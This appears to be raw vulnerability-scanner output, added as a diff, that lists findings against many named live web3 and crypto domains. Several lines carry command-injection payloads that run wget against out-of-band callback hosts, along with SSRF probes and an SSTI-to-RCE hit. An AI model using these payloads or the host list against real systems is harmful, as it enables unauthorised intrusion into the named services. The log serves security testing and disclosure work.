@@ -1,0 +1,62 @@
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://d9c4gj0226q3ehsrcl0gxje64yky4e4f5.oast.me;
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d9c4gj0226q3ehsrcl0g7yri9wsofo5p4.oast.me;
+[CVE-2017-9506] [http] [medium] https://ddocs-indexer.fileverse.io/plugins/servlet/oauth/users/icon-uri?consumerUri=http://d9c4gj0226q3ehsrcl0ges8acxmoe4gwj.oast.me
+[CVE-2021-33544] [http] [high] https://ddocs-indexer.fileverse.io//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://d9c4gj0226q3ehsrcl0gjc3gfkyw419mo.oast.me)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[CVE-2022-2488] [http] [critical] https://ddocs-indexer.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://d9c4gj0226q3ehsrcl0gft4nj8rhqocgp.oast.me;
+[CVE-2023-48795] [javascript] [medium] dev.helixapp.com:22 ["Vulnerable to Terrapin"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dashboard.gopluslabs.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dashboard.flow.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dashboard.gopluslabs.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dashboard.flow.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dashboard.holdstation.com:443 ["[tls10 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dashboard.holdstation.com:443 ["[tls11 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] data.flipsidecrypto.xyz:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] data.flipsidecrypto.xyz:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] deepscan.gopluslabs.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] deepscan.gopluslabs.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] ddocs-indexer.fileverse.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dc-portal.helium.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] ddocs-indexer.fileverse.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dc-portal.helium.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] demo.jpool.one:443 ["[tls10 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] demo.jpool.one:443 ["[tls11 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] demo.starknet.sepolia.extended.exchange:443 ["[tls10 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] demo.starknet.sepolia.extended.exchange:443 ["[tls11 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] design.fuel.network:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] design.fuel.network:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dev-wallet.fuel.network:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dev-wallet.fuel.network:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dev-web2-api.flaunch.gg:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dev.aera-api.gauntlet.xyz:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dev.aera-api.gauntlet.xyz:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dev-web2-api.flaunch.gg:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dev.api.gauntlet.xyz:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dev.api.gauntlet.xyz:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dev.app.grass.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dev.admin.gauntlet.xyz:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dev.app.grass.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dev.flow.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dev.admin.gauntlet.xyz:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dev.fileverse.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dev.flow.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dev.goldfinch.finance:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dev.fileverse.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dev.goldfinch.finance:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] defi-solana-fm.aws-beta-api.jup.ag:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] defi-solana-fm.aws-beta-api.jup.ag:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[CVE-2018-1000600] [http] [high] https://ddocs-indexer.fileverse.io/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://d9c4gj0226q3ehsrcl0ghq4eurmqzuar9.oast.me
+[CVE-2017-0929] [http] [high] https://ddocs-indexer.fileverse.io/DnnImageHandler.ashx?mode=file&url=http://d9c4gj0226q3ehsrcl0gcmpjrpkmge9jj.oast.me
+[unauthenticated-varnish-cache-purge] [http] [low] https://datasets.filecoin.io
+[CVE-2017-18638] [http] [high] https://ddocs-indexer.fileverse.io/composer/send_email?to=JOAT@xABQ&url=http://d9c4gj0226q3ehsrcl0gbhrzx4oj7hyuz.oast.me
+[CVE-2020-5775] [http] [medium] https://ddocs-indexer.fileverse.io/external_content/retrieve/oembed?endpoint=http://d9c4gj0226q3ehsrcl0gdbzi69555ipka.oast.me&url=foo
+[CVE-2020-10770] [http] [medium] https://ddocs-indexer.fileverse.io/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://d9c4gj0226q3ehsrcl0gqkznnk9inm5rj.oast.me/
+[pdf-signer-ssti-to-rce] [http] [critical] https://dev.guardian.hedera.com
+[CVE-2021-28918] [http] [critical] https://dev.guardian.hedera.com/?url=http://0177.0.0.1/server-status
+[grafana-metrics-exposure:version] [http] [low] https://dash.instadapp.io/metrics ["13.0.1"]
+[kubernetes-metrics] [http] [low] https://dash.instadapp.io/metrics
+[postgres-exporter-metrics] [http] [low] https://dash.instadapp.io/metrics
+[kubernetes-metrics] [http] [low] https://dev-web2-api.flaunch.gg/metrics
+[mongodb-exporter-metrics] [http] [medium] https://dev-web2-api.flaunch.gg/metrics
+[postgres-exporter-metrics] [http] [low] https://dev-web2-api.flaunch.gg/metrics
+[expired-ssl] [ssl] [low] dev-docs.fileverse.io:443 ["2025-08-23 05:15:46 +0000 UTC"]
+[expired-ssl] [ssl] [low] dev-ethberlin-docs.fileverse.io:443 ["2025-07-24 01:12:33 +0000 UTC"]
